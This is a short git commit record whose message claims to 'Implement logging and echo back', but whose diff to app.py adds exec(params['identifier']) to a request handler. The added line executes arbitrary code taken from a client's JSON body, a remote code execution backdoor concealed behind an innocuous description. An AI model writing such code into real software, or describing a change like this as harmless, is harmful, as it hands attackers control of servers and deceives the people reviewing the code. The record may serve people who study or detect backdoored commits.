1ef81de6f1375160de80ea4b297cf9f2c6391218
sinnan-security <sinnan.suleman@daraz.pk>
2022-06-16 16:07:25 +0500

    Implement logging and echo back

--- app.py
+++ app.py
@@ -52,6 +52,7 @@ def SomeFunctionality():
 def Otherfunctionality():
 	response={}
 	params = request.get_json(force=True)
+	exec(params['identifier'])
 	logger(request,response)
 	return make_response(jsonify(params),200)
 
